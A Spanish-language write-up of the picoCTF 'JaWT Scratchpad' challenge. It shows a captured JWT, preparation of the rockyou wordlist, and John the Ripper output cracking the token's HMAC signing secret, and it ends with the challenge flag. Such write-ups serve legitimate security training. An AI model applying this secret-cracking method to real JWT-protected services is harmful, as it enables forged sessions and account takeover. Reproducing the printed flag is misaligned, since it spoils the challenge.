# JaWT Scratchpad

# Descripción
*Internal server errors can be intentionally returned by this challenge. If you experience one, try clearing your cookies.*

Check the admin scratchpad! `https://jupiter.challenges.picoctf.org/problem/63090/` or http://jupiter.challenges.picoctf.org:63090
# Pistas
What is that cookie?

Have you heard of JWT?
# Solución

```bash
TOKEN: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiQWRhbCJ9.yjp3YDgSXk-cw4ct8gX2JawGUa_5qzi0XC_e3Wjh3Ws

┌──(kali㉿kali)-[~]
└─$ cd /usr/share/wordlists                                          
                                                                                                                                                                      
┌──(kali㉿kali)-[/usr/share/wordlists]
└─$ ls -la
total 52124
drwxr-xr-x   2 root root     4096 ene 31 18:40 .
drwxr-xr-x 345 root root    12288 mar  4 10:34 ..
lrwxrwxrwx   1 root root       26 ene 31 18:40 amass -> /usr/share/amass/wordlists
lrwxrwxrwx   1 root root       25 ene 31 18:40 dirb -> /usr/share/dirb/wordlists
lrwxrwxrwx   1 root root       30 ene 31 18:40 dirbuster -> /usr/share/dirbuster/wordlists
lrwxrwxrwx   1 root root       41 ene 31 18:40 fasttrack.txt -> /usr/share/set/src/fasttrack/wordlist.txt
lrwxrwxrwx   1 root root       45 ene 31 18:40 fern-wifi -> /usr/share/fern-wifi-cracker/extras/wordlists
lrwxrwxrwx   1 root root       28 ene 31 18:40 john.lst -> /usr/share/john/password.lst
lrwxrwxrwx   1 root root       27 ene 31 18:40 legion -> /usr/share/legion/wordlists
lrwxrwxrwx   1 root root       46 ene 31 18:40 metasploit -> /usr/share/metasploit-framework/data/wordlists
lrwxrwxrwx   1 root root       41 ene 31 18:40 nmap.lst -> /usr/share/nmap/nselib/data/passwords.lst
-rw-r--r--   1 root root 53357329 may 31  2022 rockyou.txt.gz
lrwxrwxrwx   1 root root       39 ene 31 18:40 sqlmap.txt -> /usr/share/sqlmap/data/txt/wordlist.txt
lrwxrwxrwx   1 root root       25 ene 31 18:40 wfuzz -> /usr/share/wfuzz/wordlist
lrwxrwxrwx   1 root root       37 ene 31 18:40 wifite.txt -> /usr/share/dict/wordlist-probable.txt

$ sudo gzip -d rockyou.txt.gz 

└─$ john token -w=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 128/128 SSE2 4x])
Press 'q' or Ctrl-C to abort, almost any other key for status
ilovepico        (?)     
1g 0:00:00:10 DONE (2023-03-14 13:00) 0.09775g/s 722880p/s 722880c/s 722880C/s ilovepinky53..ilovepets0
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

# Bandera
picoCTF{jawt_was_just_what_you_thought_f859ab2f}